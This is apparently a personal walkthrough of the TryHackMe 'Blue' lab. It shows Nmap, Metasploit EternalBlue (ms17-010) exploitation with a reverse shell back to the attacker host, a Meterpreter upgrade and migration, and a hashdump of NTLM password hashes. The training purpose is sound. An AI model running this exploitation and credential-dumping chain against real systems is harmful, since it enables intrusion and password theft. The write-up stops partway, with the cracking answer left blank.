# [Blue Room](https://tryhackme.com/room/blue)

```sh
export ip=10.10.243.143
```

## Task 1 Recon

Q: Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

```sh
# Nmap 7.80 scan initiated Sun Jan 17 18:34:43 2021 as: nmap -vv -Pn -sS -p1-1024 --script=vuln -oN Task1-Q1.nmap 10.10.186.180
Nmap scan report for 10.10.186.180
Host is up, received user-set (0.048s latency).
Scanned at 2021-01-17 18:34:54 CET for 18s
Not shown: 1021 closed ports
Reason: 1021 resets
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open  netbios-ssn  syn-ack ttl 127
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds syn-ack ttl 127
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Jan 17 18:35:12 2021 -- 1 IP address (1 host up) scanned in 28.37 seconds
```

A: no answer needed

Q: How many ports are open with a port number under 1000?

A: 3

Q: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

A: ms17-010

## Task 2 Gain Access

Start Metasploit

Q: Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

```sh
search ms17-010
```

A: exploit/windows/smb/ms17_010_eternalblue

Q: Show options and set the one required value. What is the name of this value? (All caps for submission)

```sh
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

A: RHOSTS

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

set payload windows/x64/shell/reverse_tcp

```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```

With that done, run the exploit!

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

```sh
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run 

[*] Started reverse TCP handler on 10.8.153.11:4444 
[*] 10.10.186.180:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.186.180:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.186.180:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.186.180:445 - Connecting to target for exploitation.
[+] 10.10.186.180:445 - Connection established for exploitation.
[+] 10.10.186.180:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.186.180:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.186.180:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.186.180:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.186.180:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.186.180:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.186.180:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.186.180:445 - Sending all but last fragment of exploit packet
[*] 10.10.186.180:445 - Starting non-paged pool grooming
[+] 10.10.186.180:445 - Sending SMBv2 buffers
[+] 10.10.186.180:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.186.180:445 - Sending final SMBv2 buffers.
[*] 10.10.186.180:445 - Sending last fragment of exploit packet!
[*] 10.10.186.180:445 - Receiving response from exploit packet
[+] 10.10.186.180:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.186.180:445 - Sending egg to corrupted connection.
[*] 10.10.186.180:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.186.180
[*] Command shell session 1 opened (10.8.153.11:4444 -> 10.10.186.180:49183) at 2021-01-17 18:40:53 +0100
[+] 10.10.186.180:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.186.180:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.186.180:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## Task 3 Escalate

Q: If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
```

Since I use bash send shell to background donw by typing *background* command.

A: post/multi/manage/shell_to_meterpreter

Q: Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)

```sh
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

A: SESSION

Set the required option, you may need to list all of the sessions to find your target here.

set SESSION 1

Run! If this doesn't work, try completing the exploit from the previous task once more.

Once the meterpreter shell conversion completes, select that session for use.

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

```shell
meterpreter > shell
Process 1688 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

```sh
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 432   660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 488   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 560   552   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 608   552   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 620   600   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 660   600   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 708   608   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 716   608   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 724   608   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 776   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 832   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1076  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1176  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 1308  708   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1316  776   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
 1344  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1404  708   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1480  708   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1584  832   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
 1620  708   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1952  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 2080  708   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2116  832   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
 2184  708   mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
 2296  708   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2344  2184  mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
 2380  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 2412  708   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe
 2552  708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2600  708   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2736  708   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe

meterpreter > 
```

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

```sh
meterpreter > migrate 2736
[*] Migrating from 1308 to 2736...
[*] Migration completed successfully.
```

## Task 4 Cracking

Q: Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

```sh
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 
```

A: Jon

Q: Copy this password hash to a file and research how to crack it. What is the cracked password?

A: 

## Task 5 Find flags!